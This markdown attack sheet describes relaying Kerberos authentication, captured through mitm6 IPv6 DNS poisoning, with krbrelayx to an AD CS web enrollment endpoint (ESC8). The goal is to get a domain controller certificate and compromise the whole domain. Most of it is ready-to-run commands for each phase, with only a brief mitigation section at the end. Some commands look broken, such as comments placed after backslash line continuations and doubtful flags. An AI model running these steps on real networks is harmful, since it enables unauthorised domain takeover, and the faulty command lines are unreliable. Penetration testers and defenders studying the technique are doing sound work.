### Overview

This attack abuses **IPv6 DNS spoofing** (mitm6) + **Kerberos relaying** (krbrelayx) to relay a machine account's Kerberos authentication to **Active Directory Certificate Services (AD CS)** HTTP enrollment endpoint. It leads to certificate enrollment as a high-privileged machine account → often **SYSTEM** code execution on the target.

**Requirements**:

- Attacker on same VLAN/subnet (IPv6 enabled on victims).
- AD CS with **Web Enrollment** (ESC8 vulnerable template).
- No strong channel binding / always-sign on the HTTP endpoint.
- Tools: mitm6 + krbrelayx (Dirk-jan Mollema).

### Attack Flow (Markdown Sheet)

#### Phase 1: Preparation

```
# Clone tools
git clone https://github.com/dirkjanm/mitm6
git clone https://github.com/dirkjanm/krbrelayx
```

Scan for vuln

```bash
certipy find -u username@domain.local -p password -dc-ip <DC-IP> -stdout
```
or: 
```
netexec ldap <DC-IP> -u username -p password -M adcs
```

from windows host:

```
certutil -dump
```

#### Phase 2: Start krbrelayx (Relay Target = AD CS)

The default Web Enrollment endpoint is almost always:

```
http://<CA-SERVER>/certsrv
https://<CA-SERVER>/certsrv
```

Point relay to it:

```bash
sudo python3 krbrelayx.py \
  -t http://ca-server.domain.local/certsrv \
  --victim dc01.domain.local \     # Optional: specific victim
  -i eth0 \                        # Interface
  --adcs                           # Enable AD CS specific handling
```

**Flags explained**:

- -t: Target enrollment endpoint (ESC8).
- --victim: (optional) Specific hostname to target.
- -i: Interface to bind listeners (SMB/HTTP/DNS).

#### Phase 3: Start mitm6 (IPv6 DNS Poisoning)

Bash

```
# In a second terminal
sudo python3 mitm6/mitm6.py \
  -i eth0 \
  -d domain.local \                # Domain to poison
  --relay-target ca-server.domain.local   # Optional
```

mitm6 will:

- Respond to DHCPv6.
- Become the primary DNS server for victims.
- Force SOA queries → trigger Kerberos auth.

#### Phase 4: Wait for Victim Authentication

- A machine (ideally Domain Controller or high-priv computer account) will send a **Kerberos AP-REQ**.
- krbrelayx captures and **relays** it to the AD CS endpoint.
- You receive a certificate for the relayed account (e.g., DC01$).

#### Phase 5: Use the Certificate

Bash

```
# Example: Request certificate via certipy or manually
certipy req -u 'dc01$' -p '' -ca 'CA_NAME' -target ca-server.domain.local

# Or use the relayed session directly in krbrelayx if configured for auto-enroll
```

Common outcome:

- Get a certificate for a Domain Controller machine account.
- Use it with **Pass-the-Certificate** or Schannel to get a TGT.
- DCSync / full domain compromise.

### Full One-Liner Style (Parallel Execution)

Bash

```
# Terminal 1
python3 krbrelayx/krbrelayx.py -t http://ca.domain.local/certsrv -i eth0

# Terminal 2
sudo python3 mitm6/mitm6.py -i eth0 -d domain.local
```

### Success Indicators

- krbrelayx shows: [*] Got Kerberos ticket from ... relaying to AD CS
- You receive a .pfx certificate for the machine account.
- High success rate against default Windows IPv6 configurations.

### Detection / Mitigation Notes

- Monitor for unusual DHCPv6 + SOA queries.
- Disable IPv6 if not needed, or use RA Guard / IPv6 ACLs.
- Enable **Extended Protection for Authentication** and strong channel binding on AD CS.
- Require signing on LDAP/SMB/HTTP where possible.

**References / Original Research**:

- Dirk-jan Mollema – [Relaying Kerberos over DNS using krbrelayx and mitm6](https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/)